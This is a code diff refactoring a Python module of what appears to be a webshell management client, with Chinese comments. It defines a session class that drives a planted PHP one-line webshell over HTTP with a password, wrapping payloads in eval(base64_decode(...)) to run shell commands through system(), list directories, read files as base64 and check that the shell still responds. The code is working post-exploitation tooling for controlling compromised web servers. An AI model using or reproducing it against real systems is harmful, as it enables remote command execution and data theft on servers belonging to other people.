@@ -1,3 +1,4 @@
+"""PHP Session的实现"""
 import base64
 import json
 import logging
@@ -9,18 +10,60 @@ from dataclasses import dataclass
 
 import httpx
 
+from . import exceptions
 from ..utils import random_english_words
 from .base import Session, DirectoryEntry
-from .exceptions import *
 
 logger = logging.getLogger("sessions.php")
+
 SUBMIT_WRAPPER_PHP = """\
 echo '{delimiter_start_1}'.'{delimiter_start_2}';\
 try{{{payload_raw}}}catch(Exception $e){{die("POSTEXEC_F"."AILED");}}\
 echo '{delimiter_stop}';"""
 
+LIST_DIR_PHP = """
+error_reporting(0);
+$folderPath = DIR_PATH;
+$files = scandir($folderPath);
+$result = array();
+foreach ($files as $file) {
+    $filePath = $folderPath . $file;
+    $fileType = filetype($filePath);
+    if($fileType == "link") {
+        if(is_dir($filePath)) {
+            $fileType = "link-dir";
+        }else if(is_file($filePath)) {
+            $fileType = "link-file";
+        }else{
+            $fileType = "unknown";
+        }
+    }
+    array_push($result, array(
+        "name" => basename($file),
+        "type" => $fileType,
+        "permission" => substr(decoct(fileperms($filePath)), -3)
+    ));
+}
+echo json_encode($result);
+"""
 
-__all__ = ["PHPWebshellMixin", "PHPWebshellOneliner"]
+GET_FILE_CONTENT_PHP = """
+$filePath = FILE_PATH;
+if(!is_file($filePath)) {
+    echo "WRONG_NOT_FILE";
+}
+else if(!is_readable($filePath)) {
+    echo "WRONG_NO_PERMISSION";
+}
+else if(filesize($filePath) > MAX_SIZE) {
+    echo "WRONG_FILE_TOO_LARGE";
+}else {
+    $content = file_get_contents($filePath);
+    echo base64_encode($content);
+}
+"""
+
+__all__ = ["PHPWebshell", "PHPWebshellOneliner"]
 
 
 @dataclass
@@ -30,12 +73,23 @@ class PHPWebshellOptions:
     encoder: t.Literal["raw", "base64"] = "raw"
     http_params_obfs: bool = False  # TODO: remove me
 
+
 def compress_php_code(source: str) -> str:
+    """去除php payload中的注释和换行
+
+    Args:
+        source (str): 原PHP payload
+
+    Returns:
+        str: 去除结果
+    """
     source = re.sub("(#|//).+\n", "\n", source)
     return re.sub(r"(?<=[\{\};])\n? +", "", source)
 
 
-class PHPWebshellMixin:
+class PHPWebshell(Session):
+    """PHP session各类工具函数的实现"""
+
     def __init__(self, options: t.Union[None, PHPWebshellOptions]):
         self.options = options if options else PHPWebshellOptions()
 
@@ -43,51 +97,22 @@ class PHPWebshellMixin:
         """应用编码器"""
         if self.options.encoder == "raw":
             return payload
-        elif self.options.encoder == "base64":
+        if self.options.encoder == "base64":
             encoded = base64.b64encode(payload.encode()).decode()
             return f'eval(base64_decode("{encoded}"));'
-        else:
-            raise RuntimeError(f"Unsupported encoder: {self.options.encoder}")
+        raise RuntimeError(f"Unsupported encoder: {self.options.encoder}")
 
     async def execute_cmd(self, cmd: str) -> str:
-        """通过system函数执行命令"""
         return await self.submit(f"system({cmd!r});")
 
     async def list_dir(self, dir_path: str) -> t.List[DirectoryEntry]:
-        """列出某个文件夹中的内容，包括`.`和`..`，如果没有内容则会填充`..`"""
         dir_path = dir_path.removesuffix("/") + "/"
-        php_code = """
-        error_reporting(0);
-        $folderPath = DIR_PATH;
-        $files = scandir($folderPath);
-        $result = array();
-        foreach ($files as $file) {
-            $filePath = $folderPath . $file;
-            $fileType = filetype($filePath);
-            if($fileType == "link") {
-                if(is_dir($filePath)) {
-                    $fileType = "link-dir";
-                }else if(is_file($filePath)) {
-                    $fileType = "link-file";
-                }else{
-                    $fileType = "unknown";
-                }
-            }
-            array_push($result, array(
-                "name" => basename($file),
-                "type" => $fileType,
-                "permission" => substr(decoct(fileperms($filePath)), -3)
-            ));
-        }
-        echo json_encode($result);
-        """.replace(
-            "DIR_PATH", repr(dir_path)
-        )
+        php_code = LIST_DIR_PHP.replace("DIR_PATH", repr(dir_path))
         json_result = await self.submit(php_code)
         try:
             result = json.loads(json_result)
         except json.JSONDecodeError as exc:
-            raise UnexpectedError("JSON解析失败: " + json_result) from exc
+            raise exceptions.UnexpectedError("JSON解析失败: " + json_result) from exc
         result = [
             DirectoryEntry(
                 name=item["name"],
@@ -109,53 +134,34 @@ class PHPWebshellMixin:
     async def get_file_contents(
         self, filepath: str, max_size: int = 1024 * 200
     ) -> bytes:
-        """获取文件的内容，内容是base64编码的字节序列，不是已经解码的字符串"""
-        php_code = """
-        $filePath = FILE_PATH;
-        if(!is_file($filePath)) {
-            echo "WRONG_NOT_FILE";
-        }
-        else if(!is_readable($filePath)) {
-            echo "WRONG_NO_PERMISSION";
-        }
-        else if(filesize($filePath) > MAX_SIZE) {
-            echo "WRONG_FILE_TOO_LARGE";
-        }else {
-            $content = file_get_contents($filePath);
-            echo base64_encode($content);
-        }
-        """.replace(
-            "FILE_PATH", repr(filepath)
-        ).replace(
+        php_code = GET_FILE_CONTENT_PHP.replace("FILE_PATH", repr(filepath)).replace(
             "MAX_SIZE", str(max_size)
         )
         result = await self.submit(php_code)
         if result == "WRONG_NOT_FILE":
-            raise FileError("目标不是一个文件")
+            raise exceptions.FileError("目标不是一个文件")
         if result == "WRONG_NO_PERMISSION":
-            raise FileError("没有权限读取这个文件")
+            raise exceptions.FileError("没有权限读取这个文件")
         if result == "WRONG_FILE_TOO_LARGE":
-            raise FileError(f"文件大小太大(>{max_size}B)，建议下载编辑")
+            raise exceptions.FileError(f"文件大小太大(>{max_size}B)，建议下载编辑")
         return base64.b64decode(result)
 
     async def get_pwd(self) -> str:
-        """获取当前文件夹"""
         return await self.submit("echo __DIR__;")
 
     async def test_usablility(self) -> bool:
-        """通过echo测试php webshell的可用性"""
         first_string, second_string = (
             "".join(random.choices(string.ascii_lowercase, k=6)),
             "".join(random.choices(string.ascii_lowercase, k=6)),
         )
         try:
             result = await self.submit(f"echo '{first_string}' . '{second_string}';")
-        except NetworkError:
+        except exceptions.NetworkError:
             return False
         return (first_string + second_string) in result
 
     async def submit(self, payload: str) -> str:
-        """将payload通过encoder编码后提交"""
+        """将php payload通过encoder编码后提交"""
         start, stop = (
             "".join(random.choices(string.ascii_lowercase, k=6)),
             "".join(random.choices(string.ascii_lowercase, k=6)),
@@ -170,15 +176,19 @@ class PHPWebshellMixin:
         payload = self.encode(payload)
         status_code, text = await self.submit_raw(payload)
         if status_code != 200:
-            raise UnexpectedError(f"status code error: {status_code}")
+            raise exceptions.UnexpectedError(f"status code error: {status_code}")
         if "POSTEXEC_FAILED" in text:
-            raise UnexpectedError("POSTEXEC_FAILED found, payload run failed")
+            raise exceptions.UnexpectedError(
+                "POSTEXEC_FAILED found, payload run failed"
+            )
         idx_start = text.find(start)
         if idx_start == -1:
-            raise UnexpectedError(f"idx error: start={idx_start}, text={repr(text)}")
+            raise exceptions.UnexpectedError(
+                f"idx error: start={idx_start}, text={repr(text)}"
+            )
         idx_stop_r = text[idx_start:].find(stop)
         if idx_stop_r == -1:
-            raise UnexpectedError(
+            raise exceptions.UnexpectedError(
                 f"idx error: start={idx_start}, stop_r={idx_stop_r}, text={text!r}"
             )
         idx_stop = idx_stop_r + idx_start
@@ -196,7 +206,7 @@ class PHPWebshellMixin:
         raise NotImplementedError("这个函数应该由实际的实现override")
 
 
-class PHPWebshellOneliner(PHPWebshellMixin, Session):
+class PHPWebshellOneliner(PHPWebshell):
     """一句话的php webshell"""
 
     def __init__(
@@ -209,7 +219,7 @@ class PHPWebshellOneliner(PHPWebshellMixin, Session):
         http_params_obfs: bool = False,
         options: t.Union[PHPWebshellOptions, None] = None,
     ) -> None:
-        PHPWebshellMixin.__init__(self, options)
+        super().__init__(options)
         self.method = method.upper()
         self.url = url
         self.password = password
@@ -239,4 +249,4 @@ class PHPWebshellOneliner(PHPWebshellMixin, Session):
                 return response.status_code, response.text
 
         except httpx.HTTPError as exc:
-            raise NetworkError("发送HTTP请求失败") from exc
+            raise exceptions.NetworkError("发送HTTP请求失败") from exc
